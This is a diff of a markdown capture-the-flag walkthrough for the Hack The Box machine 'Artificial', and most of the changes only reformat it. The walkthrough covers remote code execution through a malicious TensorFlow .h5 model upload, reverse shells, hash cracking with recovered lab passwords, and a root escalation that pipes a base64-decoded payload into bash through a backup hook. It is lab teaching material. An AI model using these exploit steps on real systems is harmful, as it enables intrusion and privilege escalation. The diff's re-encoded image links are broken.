@@ -1,17 +1,17 @@
-# ARTIFICIAL
 
-## PORT SCAN
+# PORT SCAN
+---
 
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 
-## RECONNAISSANCE
 
-***
+
+# RECONNAISSANCE
+---
 
 We need to add `artifical.htb` to `/etc/hosts`:
 
@@ -19,19 +19,20 @@ We need to add `artifical.htb` to `/etc/hosts`:
 echo '10.10.11.75 artificial.htb' | sudo tee -a /etc/hosts
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250627150218.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250627150218.png)
 
 If we check the source code, we can notice this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250627150300.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250627150300.png)
 
 This seems to be a web application that uses TensorFlow, TensorFlow is an open-source machine learning framework developed by Google. It's widely used for building and training deep learning models, especially in tasks like image recognition, natural language processing, and predictive analytics.
 
-Let's save that info for now, since we can register on the site, it's a nice approach to create a test account to check for functionalities:
+Let's save that info for now, since we can register on the site, it's a nice approach to create a test account to check for functionalities: 
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250627150635.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250627150701.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250627150635.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250627150701.png)
 
 As seen, we can upload files, if we check the requirements and the dockerfile we can download, we can check this:
 
@@ -54,23 +55,25 @@ RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinu
 ENTRYPOINT ["/bin/bash"]
 ```
 
+
 We can find that this uses `tensorflow-cpu 2.13.1`, if we search for rce regarding TensorFlow, we can check this:
+
 
 BLOG: https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model
 
 Let's begin exploitation to reproduce the steps.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 Based on the article, we can do this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250627151445.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250627151445.png)
 
 So, we need to create a `.h5` file with the following script in order to import the os library to achieve the RCE:
 
-```python
+```PYTHON
 import tensorflow as tf
 
 def exploit(x):
@@ -103,17 +106,19 @@ docker run -it --rm -v "$PWD":/app -w /app tensorflow/tensorflow:2.13.0 python3 
 
 Now, we will get our `exploit.h5` file which we can upload on the dashboard:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250627154846.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250627154846.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250627154904.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250627154904.png)
 
 We need to click on `View Predictions` and set up our listener before we do it, then, we will receive our shell:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628144655.png) There we go, let's begin privilege escalation.
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628144655.png)
+There we go, let's begin privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+# PRIVILEGE ESCALATION
+---
+
 
 First of all, let's stabilize our shell:
 
@@ -127,15 +132,15 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628145158.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628145158.png)
 
 We can use linpeas to check any PE path we may have:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628145911.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628145911.png)
 
 We can see a `users.db` file inside of here, if we check it on `sqlitebrowser`, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628145943.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628145943.png)
 
 We got some users with hashes, let's get them and attempt to crack them:
 
@@ -161,9 +166,11 @@ The hashes found credentials for `gael` and `royer`, only `gaek` works on ssh:
 gael:mattp005numbertwo
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628150408.png) Let's run linpeas again:
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628150408.png)
+Let's run linpeas again:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628150546.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628150546.png)
+
 
 Port `9898` seems weird, let's perform `ssh tunneling` to check the contents of it:
 
@@ -171,11 +178,11 @@ Port `9898` seems weird, let's perform `ssh tunneling` to check the contents of 
 ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628150721.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628150721.png)
 
 We need some creds for it, if we check our linpeas scan, we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628151017.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628151017.png)
 
 We got a `backrest_backup` file, let's get it and check the contents:
 
@@ -234,11 +241,12 @@ Nice, we got credentials for the web page:
 backrest_root:!@#$%^
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628151732.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628151732.png)
+
 
 As seen, we can make repositories:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628152029.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628152029.png)
 
 This manages something called `restic`, we can go with two `privilege escalation paths` on here, first, we can exploit the `restic` privesc shown on `gtfobins`:
 
@@ -246,7 +254,9 @@ GTFOBINS: https://gtfobins.github.io/gtfobins/restic/
 
 Or we can speed up the process by creating a malicious hook that will get us a shell as root, as seen on the image, we can create hooks which will execute as commands:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628152257.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628152257.png)
+
 
 Let's create a base repository which will include the following hook and `ENV Var`;
 
@@ -270,11 +280,11 @@ RESTIC_PASSWORD_COMMAND=echo '<base64>' | base64 -d | bash
 
 The repo should look like this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628152715.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628152715.png)
 
 Now, set up our listener and submit the repo:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628152747.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628152747.png)
 
 Once we submit it, we get our root shell, let's get both flags:
 
@@ -286,6 +296,10 @@ root@artificial:/# cat /root/root.txt
 841c116f4c7b582a36448e761a8aa541
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250628152903.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250628152903.png)
+
 
 https://labs.hackthebox.com/achievement/machine/1872557/668
+
+
